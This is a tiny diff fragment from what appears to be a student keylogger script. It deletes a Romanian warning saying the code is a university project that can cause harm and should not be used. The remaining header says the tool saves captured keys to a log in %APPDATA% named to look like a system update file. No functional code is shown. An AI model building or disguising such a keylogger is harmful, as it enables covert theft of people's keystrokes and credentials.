@@ -1,4 +1,4 @@
-//ACESTA ESTE UN PROIECT PENTRU FACULTATE, A NU SE FOLOSI CODUL DE AICI. POATE DAUNA
+
 # ================================================
 # KEYLOGGER SIMPLU - Varianta Educationala
 # Salveaza local in %APPDATA%\system_update.log
